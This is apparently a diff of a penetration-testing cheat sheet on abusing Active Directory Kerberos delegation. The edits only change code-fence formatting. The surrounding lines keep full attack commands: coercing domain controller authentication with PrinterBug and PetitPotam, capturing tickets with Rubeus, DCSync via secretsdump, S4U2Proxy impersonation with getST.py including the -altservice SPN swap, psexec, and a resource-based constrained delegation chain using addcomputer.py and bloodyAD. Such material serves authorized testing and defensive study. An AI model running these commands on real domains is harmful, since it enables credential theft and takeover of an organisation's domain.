@@ -23,25 +23,25 @@ Any user who authenticates to an unconstrained delegation host sends their TGT a
 
 **Highest value:** Coerce the DC to authenticate to the unconstrained host: you get the DC machine account TGT, which can be used for DCSync.
 
-```powershell
+```powershell wrap
 # Find unconstrained delegation hosts (excluding DCs: they have it by default)
 Get-DomainComputer -Unconstrained | Select-Object name, dnshostname
 Get-DomainUser -AllowDelegation | Select-Object samaccountname  # user accounts with unconstrained
 ```
 
-```bash
+```bash wrap
 # nxc
 nxc ldap $IP -u $USER -p $PASSWORD --trusted-for-delegation
 ```
 
-```bash
+```bash wrap
 # Coerce DC to authenticate to the unconstrained host
 # (run from compromised host or attacker box)
 printerbug.py $DOMAIN/$USER:$PASSWORD@$DC_IP $IP
 PetitPotam.py -u $USER -p $PASSWORD $IP $DC_IP
 ```
 
-```powershell
+```powershell wrap
 # On the unconstrained delegation host: monitor for incoming TGTs
 Rubeus.exe monitor /interval:5 /nowrap
 
@@ -56,18 +56,18 @@ secretsdump.py -k -no-pass $DOMAIN/DC01$@$DC_HOST
 
 The account has `msDS-AllowedToDelegateTo` set to a list of specific SPNs it can delegate to. If `TRUSTED_TO_AUTH_FOR_DELEGATION` flag is also set (T2A4D / protocol transition), the account can use S4U2Self for any user.
 
-```powershell
+```powershell wrap
 # Find constrained delegation accounts
 Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
 Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
 ```
 
-```bash
+```bash wrap
 # nxc
 nxc ldap $IP -u $USER -p $PASSWORD --find-delegation
 ```
 
-```bash
+```bash wrap
 # S4U2Proxy abuse: impersonate Administrator to delegated service
 getST.py $DOMAIN/svc_account:$PASSWORD \
   -spn cifs/target.$DOMAIN \
@@ -82,7 +82,7 @@ psexec.py -k -no-pass Administrator@target.$DOMAIN
 
 If delegation rights exist to a low-value SPN (e.g., `time/target`), use `-altservice` to substitute the SPN in the ticket header. The KDC won't validate the final SPN against the allowed list at ticket use time: only the PAC is checked.
 
-```bash
+```bash wrap
 # Delegation is to: time/target.domain.local
 # You want: cifs/target.domain.local
 
@@ -107,7 +107,7 @@ RBCD inverts the trust model: instead of the delegating account controlling wher
 
 **Full attack chain:**
 
-```bash
+```bash wrap
 # Step 1: Create a computer account (if needed)
 addcomputer.py $DOMAIN/$USER:$PASSWORD -computer-name '$COMP_NAME' -computer-pass $COMP_PASS
 
@@ -115,7 +115,7 @@ addcomputer.py $DOMAIN/$USER:$PASSWORD -computer-name '$COMP_NAME' -computer-pas
 nxc ldap $IP -u $USER -p $PASSWORD -M maq
 ```
 
-```bash
+```bash wrap
 # Step 2: Set RBCD on target: allow EVIL$ to act on behalf of any user to TARGET$
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set object TARGET$ msDS-AllowedToActOnBehalfOfOtherIdentity \
@@ -126,12 +126,12 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
 ```
 
-```bash
+```bash wrap
 # Alternative: set via LDAP shell (if you got one via Certipy or similar)
 # ldap_shell> set_rbcd TARGET$ EVIL$
 ```
 
-```bash
+```bash wrap
 # Step 3: Get service ticket impersonating Administrator to TARGET$
 getST.py $DOMAIN/'$COMP_NAME':$COMP_PASS \
   -spn cifs/TARGET.$DOMAIN \
